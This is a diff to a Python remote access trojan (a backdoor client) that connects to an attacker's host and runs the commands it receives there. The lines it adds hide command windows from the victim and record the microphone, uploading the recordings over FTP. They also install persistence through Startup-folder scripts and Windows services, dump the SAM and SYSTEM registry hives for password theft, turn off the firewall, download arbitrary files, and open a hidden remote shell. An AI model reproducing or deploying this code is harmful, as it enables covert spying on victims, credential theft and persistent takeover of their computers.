@@ -29,11 +29,16 @@ import numpy as np
 import netifaces
 import pyttsx3
 import ctypes
+import glob
+import pyaudio
+import wave
 
 if 'Linux' not in platform.platform():
     import win32con
     from PIL import ImageGrab
     from PIL import Image
+    import pyautogui
+    import imutils
 
 elif 'Windows' not in platform.platform():
     import pyautogui
@@ -91,44 +96,65 @@ def popen2socket(server_socket, p):
 
 def sys_required():
     if sys.version[0] =='3':
-        sys.exit('[*] Please Run Backdoor With Python2')
+        sys.exit('[*] Please Run With Python2')
 
 
 global cmdkeyvideo
 global key_video
 global host_alive
+global temp_pers
 host_alive = []
 
-def webcam_video_stream():
-    global stream
-    stream = False
+temp_pers_vbs = '''
+Dim nativsystem
+Set nativshellsystem = WScript.CreateObject("WScript.shell")
+
+Do while True:
+	nativshellsystem.Run "payl_bin", 0, true
+	WScript.Sleep(10000)
+loop
+'''
+
+temp_pers_bat = '''
+@echo off
+nativsystem
+:service_nativ
+timeout 10 > NUL
+start payl_bin
+goto:service_nativ
+'''
 
 def try_ping(host):
     try:
         if 'Linux' not in platform.platform():
-            req_ping = os.system('ping -n 1 %s > /dev/null' % (host))
-
-            if req_ping ==0:
-                get_hostname = socket.gethostbyaddr(host)
-                t = datetime.now().strftime('%H:%M:%S')
-                host_alive.append('IP : %s Hostname : %s\n' % (host,get_hostname[0]))
-
-            else:
+            SW_HIDE = 0
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+            info.wShowWindow = SW_HIDE
+            req_ping = subprocess.Popen('ping -n 1 %s' % (host), shell=True, startupinfo=info, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            out_req = req_ping.stdout.read() + req_ping.stderr.read()
+            lenght_out = len(out_req)
+            
+            if lenght_out ==246:
+                #print('[*] Not Found !')
                 pass
+            elif lenght_out>246:
+                #print('yess')
+                get_hostname = socket.gethostbyaddr(host)
+                host_alive.append('IP : %s Hostname : %s\n' % (host,get_hostname[0]))
 
         elif 'Windows' not in platform.platform():
-            req_ping = os.system('ping -c 1 -b %s > /dev/null' % (host))
+            req_ping = os.system('ping -c 1 -b %s > /dev/null ' % (host))
 
             if req_ping ==0:
                 get_hostname = socket.gethostbyaddr(host)
-                t = datetime.now().strftime('%H:%M:%S')
                 host_alive.append('IP : %s Hostname : %s\n' % (host,get_hostname[0]))
 
             else:
                 pass
 
-    except Exception as error_req_host:
-        server_socket.send('[*] %s' % (error_req_host))
+    except:
+        pass
 
 def start_scanner_network():
     gtw = netifaces.gateways()
@@ -277,6 +303,69 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                 except Exception as error_webcam_snap:
                     server_socket.sendall(error_webcam_snap)
                     pass
+            
+            elif data.startswith('getuid')==True:
+                try:
+                    if 'Linux' not in platform.platform():
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        uid = subprocess.Popen('echo %Username%', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
+                        out_uid = uid.stdout.read() + uid.stderr.read()
+                        server_socket.send('[*] UID => %s ' % (out_uid))
+                    
+                    elif 'Windows' not in platform.platform():
+                        whoami = subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        out_whoami = whoami.stdout.read() + whoami.stderr.read()
+                        server_socket.send('[*] UID => %s' % (out_whoami))
+                except:
+                    server_socket.send('[*] Error Getuid')
+            
+            elif data.startswith('record_mic')==True:
+                split = shlex.split(data)
+                if len(split)==2:
+                    seconds = split[1]
+                    int_seconds = int(seconds)
+                    try:
+                        t = datetime.now().strftime('%H_%M')
+                        filename = 'output_%s.wav' % (t)
+                        CHUNK = 1024
+                        FORMAT = pyaudio.paInt16
+                        CHANNELS = 2
+                        RATE = 44100
+                        RECORD_SECONDS = int_seconds
+                        p = pyaudio.PyAudio()
+                        stream = p.open(format=FORMAT,channels=CHANNELS,rate=RATE,input=True,frames_per_buffer=CHUNK)
+                        frames = []
+                        
+                        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
+                            data = stream.read(CHUNK)
+                            frames.append(data)
+                        
+                        stream.stop_stream()
+                        stream.close()
+                        p.terminate()
+                        wf = wave.open(filename, 'wb')
+                        wf.setnchannels(CHANNELS)
+                        wf.setsampwidth(p.get_sample_size(FORMAT))
+                        wf.setframerate(RATE)
+                        wf.writeframes(b''.join(frames))
+                        wf.close()
+                        connect = FTP(FTPHOST)
+                        connect.login(FTPUSER,FTPPASSWD)
+                        current_path=os.getcwd()
+                        file=open(current_path+'/'+filename,'rb')
+                        connect.storbinary('STOR '+filename, file)
+                        file.close()
+                        connect.quit()
+                        os.remove(filename)
+                        server_socket.sendall('[*] Recording Save as %s' % (filename))
+                    except:
+                        server_socket.send('[*] Error Recording !')
+                
+                else:
+                    server_socket.send('[*] Error : record_mic <seconds>\nexample : record_mic 10\n')
 
             elif data.startswith('cwpasswd')==True:
                 recv_cwpasswd=data[9:]
@@ -292,7 +381,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
 
             elif data.startswith('netuser')==True:
                 try:
-                    cmd_net_user = subprocess.Popen(['net','user'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    SW_HIDE = 0
+                    info = subprocess.STARTUPINFO()
+                    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                    info.wShowWindow = SW_HIDE
+                    cmd_net_user = subprocess.Popen(['net','user'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                     out_cmd_net_user = cmd_net_user.stdout.read() + cmd_net_user.stderr.read()
                     server_socket.send(out_cmd_net_user)
 
@@ -303,7 +396,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                 proc=data[6:]
                 try:
                     if 'Linux' not in platform.platform():
-                        os.system('taskkill /F /IM %s' % (proc))
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        s = subprocess.Popen('taskkill /F /IM %s' % (proc), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         server_socket.send('[*] Task Killed ! %s\n' % (proc))
 
                     elif 'Windows' not in platform.platform():
@@ -321,7 +418,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                 split = shlex.split(processus)
                 try:
                     if 'Linux' not in platform.platform():
-                        os.system('start %s &' % (split[1]))
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        s = subprocess.PIPE('start %s &' % (split[1]), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         server_socket.send('[*] Task Started : %s !' % (split[1]))
 
                     elif 'Windows' not in platform.platform():
@@ -337,7 +438,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                     f=open('msg.vbs','w')
                     f.write('msgbox "%s"' % (message))
                     f.close()
-                    os.system('start msg.vbs')
+                    SW_HIDE = 0
+                    info = subprocess.STARTUPINFO()
+                    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                    info.wShowWindow = SW_HIDE
+                    s=subprocess.Popen('start msg.vbs &', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                     time.sleep(1)
                     os.system('del msg.vbs /Q')
                     server_socket.send('[*] Message Sent : %s\n' % (message))
@@ -375,7 +480,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                     f.write('msgbox "%s"\n' % (message_loop))
                     f.write('loop\n')
                     f.close()
-                    os.system('start msgloop.vbs')
+                    SW_HIDE = 0
+                    info = subprocess.STARTUPINFO()
+                    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                    info.wShowWindow = SW_HIDE
+                    s = subprocess.Popen('start msgloop.vbs &', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                     time.sleep(1)
                     os.system('del msgloop.vbs /Q')
                     server_socket.send('[*] Message Loop Sent : %s' % (message_loop))
@@ -392,6 +501,7 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                     server_socket.send(error_resettime)
 
             elif data.startswith('ftpupload')==True:
+                time.sleep(1)
                 filename=data
                 split = shlex.split(filename)
                 try:
@@ -405,6 +515,97 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                     server_socket.sendall('[*] %s Uploaded !' % (filename))
                 except Exception as error_ftpupload:
                     server_socket.sendall(error_ftpupload)
+            
+            elif data.startswith('persistence')==True:
+                split = shlex.split(data)
+                
+                if len(split) ==1:
+                    server_socket.send('---===[Persistence Help]===---\nmethod :\n1 <bat/vbs> <payload_path> | Make Persistence with .vbs or .bat and restart payload with 10 seconds interval\n2 <payload_path> | copy payload on startup\n3 <service_name> <payload_path>\n')
+                
+                elif split[1] =="1":
+                    if len(split) ==4:
+                        if split[2] =="bat":
+                            f=open('nativsystem.bat','w')
+                            f.write(temp_pers_bat)
+                            f.close()
+                            f=open('nativsystem.bat','r')
+                            content = f.read()
+                            f.close()
+                            replace_nativ = content.replace('payl_bin',split[3])
+                            f=open('nativsystem.bat','w')
+                            f.write(replace_nativ)
+                            f.close()
+                            SW_HIDE = 0
+                            info = subprocess.STARTUPINFO()
+                            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                            info.wShowWindow = SW_HIDE
+                            var_username = subprocess.Popen('echo %username%', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
+                            out_var_username = var_username.stdout.read()
+                            split_slash_var_username = out_var_username.split('\r\n')
+                            os.system('move nativsystem.bat "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"' % (split_slash_var_username[0]))
+                            server_socket.send('[*] Persistence Created and save as C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\nativsystem.bat' % (split_slash_var_username[0]))
+
+                        
+                        elif split[2] =="vbs":
+                            f=open('nativsystem.vbs','w')
+                            f.write(temp_pers_vbs)
+                            f.close()
+                            f=open('nativsystem.vbs','r')
+                            content = f.read()
+                            f.close()
+                            replace_nativ = content.replace('payl_bin',split[3])
+                            f=open('nativsystem.vbs','w')
+                            f.write(replace_nativ)
+                            f.close()
+                            SW_HIDE = 0
+                            info = subprocess.STARTUPINFO()
+                            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                            info.wShowWindow = SW_HIDE
+                            var_username = subprocess.Popen('echo %UserName%', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
+                            out_var_username = var_username.stdout.read()
+                            split_slash_var_username = out_var_username.split('\r\n')
+                            os.system('move nativsystem.vbs "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"' % (split_slash_var_username[0]))
+                            server_socket.send('[*] Persistence Created and save as C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\nativsystem.vbs' % (split_slash_var_username[0]))
+
+                        else:
+                            server_socket.send('[*] Format Script error : %s' % (split[2]))
+
+                    else:
+                        server_socket.send('[*] Error : persistence 1 => arguments required !\n')
+                
+                elif split[1] =="2":
+                    if len(split) ==3:
+                        try:
+                            var_username = subprocess.Popen('echo %UserName%', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                            out_var_username = var_username.stdout.read()
+                            split_slash_var_username = out_var_username.split('\r\n')
+                            os.system('copy %s C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % (split[2],split_slash_var_username[0]))
+                        
+                        except:
+                            server_socket.send('[*] Error : persistence 2 => arguments required !\n')
+                    
+                    else:
+                        server_socket.send('[*] Format Script error : %s' % (split[2]))
+                
+                elif split[1] =="3":
+                    if len(split)==4:
+                        try:
+                            service_name = split[2]
+                            binpath = split[3]
+                            cmd_pers = subprocess.Popen('sc create %s binpath="%s" start=auto' % (service_name,binpath), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                            out_cmd_pers = cmd_pers.stdout.read() + cmd_pers.stderr.read()
+                            server_socket.sendall(out_cmd_pers)
+                        except:
+                            server_socket.send('[*] Error : persistence 3 => arguments required ! \n')
+                    
+                    else:
+                        server_socket.send('[*] Error : Persistence !\n')
+                
+                else:
+                    server_socket.send('[*] Error : Persistence !\n')
+
+
+
 
             elif data.startswith('move')==True:
                 file_move=data[5:]
@@ -456,7 +657,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                 ip = data[5:]
                 try:
                     if 'Linux' not in platform.platform():
-                        ping_cmd_win = subprocess.Popen('ping -n 1 %s' % (ip), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        ping_cmd_win = subprocess.Popen('ping -n 1 %s' % (ip), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         out_ping_cmd = ping_cmd_win.stdout.read() + ping_cmd_win.stderr.read()
                         server_socket.sendall(out_ping_cmd)
 
@@ -496,10 +701,10 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
             elif data.startswith('screenshot')==True:
                 try:
                     if 'Linux' not in platform.platform():
-                        im = ImageGrab.grab()
                         t = datetime.now().strftime('%H_%M')
                         name = 'screenshot_%s.png' % (t)
-                        im.save(name)
+                        im = pyautogui.screenshot(name)
+                        #im.save(name)
                         connect = FTP(FTPHOST)
                         connect.login(FTPUSER,FTPPASSWD)
                         filename = name
@@ -618,7 +823,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
             elif data.startswith('ifconfig')==True:
                 try:
                     if 'Linux' not in platform.platform():
-                        cmd_ifconfig = subprocess.Popen(['ipconfig'],shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        cmd_ifconfig = subprocess.Popen(['ipconfig'],shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         out_cmd = cmd_ifconfig.stdout.read() + cmd_ifconfig.stderr.read()
                         server_socket.sendall(out_cmd)
 
@@ -642,8 +851,9 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                     server_socket.send(error_start_webbrowser)
 
             elif data.startswith('change_wallpaper')==True:
+                split = shlex.split(data)
                 try:
-                    url = 'https://www.desktopbackground.org/p/2013/10/20/657022_21-scary-wallpapers-creepy-ghost-backgrounds-images_1024x768_h.jpg'
+                    url = split[1]
                     name = 'wlp.jpg'
                     urllib.urlretrieve(url, name)
                     path_current = os.getcwd()
@@ -652,10 +862,20 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                     ctypes.windll.user32.SystemParametersInfoA(win32con.SPI_SETDESKWALLPAPER,0,path.encode(),changed)
                     time.sleep(2)
                     os.remove('wlp.jpg')
-                    server_socket.send('[*] Wallpaper Changed To => Wallpaper Paraghost !')
+                    server_socket.send('[*] Wallpaper Changed To => Wallpaper !')
 
                 except Exception as error_cwlp_background:
                     server_socket.send(error_cwlp_background)
+            
+            elif data.startswith('webdownload')==True:
+                split = shlex.split(data)
+                try:
+                    url = split[1]
+                    name = split[2]
+                    urllib.urlretrieve(url,name)
+                    server_socket.send('[*] %s Downloaded From The Web !' % (name))
+                except:
+                    server_socket.send('[*] WebDownload error !')
 
             elif data.startswith('opendiskloop')==True:
                 try:
@@ -668,9 +888,13 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                         f.write('colCDROMs.Item(d).Eject\n')
                         f.write('Loop\n')
                         f.close()
-                        os.system('start opendisk.vbs &')
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        s = subprocess.Popen('start opendisk.vbs &', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         time.sleep(0.5)
-                        os.system('del opendisk.vbs /Q')
+                        s2 = subprocess.Popen('del opendisk.vbs /Q', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         server_socket.send('[*] Open Disk Loop Started !')
 
                     elif 'Windows' not in platform.platform():
@@ -688,9 +912,13 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                         f.write('colCDROMs.Item(d).Eject\n')
                         f.write('colCDROMs.Item(d).Eject\n')
                         f.close()
-                        os.system('start opendisk.vbs &')
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        s = subprocess.Popen('start opendisk.vbs &', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         time.sleep(0.5)
-                        os.system('del opendisk.vbs /Q')
+                        s2 = subprocess.Popen('del opendisk.vbs /Q', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, startupinfo=info)
                         server_socket.send('[*] Open Disk And Close Disk !')
 
                     elif 'Windows' not in platform.platform():
@@ -759,6 +987,10 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
 
             elif data.startswith('whoami')==True:
                 try:
+                    SW_HIDE = 0
+                    info = subprocess.STARTUPINFO()
+                    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                    info.wShowWindow = SW_HIDE
                     if 'Windows' not in platform.platform():
                         cmd_whoami = subprocess.Popen(['whoami'], shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
                         out_cmd_whoami = cmd_whoami.stderr.read() + cmd_whoami.stdout.read()
@@ -794,11 +1026,15 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
 
             elif data.startswith('sysinfo')==True:
                 try:
+                    SW_HIDE = 0
+                    info = subprocess.STARTUPINFO()
+                    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                    info.wShowWindow = SW_HIDE
                     platform_os = platform.system()
                     platform_version = platform.version()
                     platform_architecture = platform.architecture()[0]
                     platform_hostname = platform.node()
-                    cmd_whoami_info = subprocess.Popen(['whoami'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    cmd_whoami_info = subprocess.Popen(['whoami'], shell=True, startupinfo=info, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                     out_cmd_whinfo = cmd_whoami_info.stdout.read() + cmd_whoami_info.stderr.read()
                     server_socket.sendall('[*] OS : %s\n[*] Version : %s\n[*] Architecture : %s\n[*] Hostname : %s\n[*] Public IP : %s\n[*] Local IP : %s\n[*] User Session : %s\n\n' % (platform_os,platform_version,platform_architecture,platform_hostname,ip,localip,out_cmd_whinfo))
 
@@ -912,21 +1148,49 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                 port_scan = []
 
 
-
             elif data.startswith('ls') or data.startswith('dir')==True:
                 try:
-                    if 'Linux' not in platform.platform():
-                        dir_exec = subprocess.Popen(['dir'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        out_dir = dir_exec.stdout.read() + dir_exec.stderr.read()
-                        server_socket.sendall(out_dir)
+                    ld = glob.glob('*')
+                    hd = glob.glob('.*')
+                    for hrepo in hd:
+                        server_socket.send('%s\n' % (hrepo))
+                    for repo in ld:
+                        server_socket.send('%s\n' % (repo))
 
-                    elif 'Windows' not in platform.platform():
-                        ls_exec = subprocess.Popen(['ls -a'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                        ls_dir = ls_exec.stdout.read() + ls_exec.stderr.read()
-                        server_socket.sendall(ls_dir)
+                except Exception as error_list_dir:
+                    server_socket.send(error_list_dir)
+            
+            elif data.startswith('dump_sam_system')==True:
+                try:
+                    dump_db = os.system('reg save hklm\\sam C:\\sam && reg save hklm\\system C:\\system > NUL')
+                    if dump_db ==0:
+                        connect = FTP(FTPHOST)
+                        connect.login(FTPUSER,FTPPASSWD)
+                        filename_sam = 'C:\\sam'
+                        filename_system = 'C:\\system'
+                        file1 = open(filename_sam,'rb')
+                        file2 = open(filename_system,'rb')
+                        connect.storbinary('STOR '+filename_sam, file1)
+                        connect.storbinary('STOR '+filename_system, file2)
+                        file.close()
+                        connect.quit()
+                        server_socket.send('[*] Sam & System File DB Downloaded !')
+                    else:
+                        server_socket.send('[*] Error Dump Sam & System !')
 
-                except Exception as error_list_dirrectory:
-                    server_socket.sendall(error_list_dirrectory)
+                except:
+                    server_socket.send('[*] Error Dump SAM & SYSTEM FILE !')
+            
+            elif data.startswith('kwindef')==True:
+                try:
+                    SW_HIDE = 0
+                    info = subprocess.STARTUPINFO()
+                    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                    info.wShowWindow = SW_HIDE
+                    s = subprocess.Popen('netsh advfirewall set allprofiles state off', startupinfo=info, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    server_socket.send('[*] Kill Windows Defender !')
+                except:
+                    server_socket.send('[*] Error show wifi passwd')
 
             elif data.startswith('ps')==True:
                 try:
@@ -965,7 +1229,11 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                 cmd = data[4:]
                 try:
                     if 'Linux' not in platform.platform():
-                        cmd_exec = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        cmd_exec = subprocess.Popen(cmd, shell=True, startupinfo=info,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                         out_cmd_exec = cmd_exec.stdout.read() + cmd_exec.stderr.read()
                         server_socket.sendall(out_cmd_exec)
 
@@ -975,12 +1243,16 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
                         server_socket.sendall(out_cmd_exec)
 
                 except Exception as error_sh_execute:
-                    server_socket.send('[*] Error Sh Execute Command !')
+                    server_socket.send('[*] Error Sh Execute Command ! : %s ' % (error_sh_execute))
 
             elif data.startswith('shell')==True:
                 if 'Linux' not in platform.platform():
                     try:
-                        p=subprocess.Popen(["c:\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+                        SW_HIDE = 0
+                        info = subprocess.STARTUPINFO()
+                        info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+                        info.wShowWindow = SW_HIDE
+                        p=subprocess.Popen(["c:\\windows\\system32\\cmd.exe"], shell=False, startupinfo=info, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
 
                         s2p_thread = threading.Thread(target=server2popen, args=[server_socket, p])
                         s2p_thread.daemon = True
@@ -1026,7 +1298,7 @@ def main_config_server(LHOST,LPORT,FTPHOST,FTPPORT,FTPUSER,FTPPASSWD,log_dir_key
 
 
 def main():
-    LHOST = '192.168.1.71'
+    LHOST = '192.168.1.27'
     LPORT = 1334
     FTPHOST = LHOST
     FTPPORT = 21
